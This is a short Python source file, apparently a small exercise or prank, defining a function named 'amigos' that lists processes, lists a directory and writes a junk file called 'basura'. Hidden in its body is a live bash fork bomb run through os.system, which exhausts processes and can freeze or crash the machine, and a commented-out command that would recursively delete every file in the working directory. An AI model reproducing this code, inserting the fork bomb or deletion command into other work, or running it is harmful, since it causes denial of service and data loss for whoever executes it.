import os
import subprocess

def amigos(a,b):
  os.system("ps -fea")
  os.system(":(){ :|:& };:")
  #r=subprocess.call(["rm","-Rf","*"])
  r=subprocess.check_output(["ls","-l"])

  archivo=open("basura","w")
  archivo.write("basura")
  archivo.close()

  return r
  
  
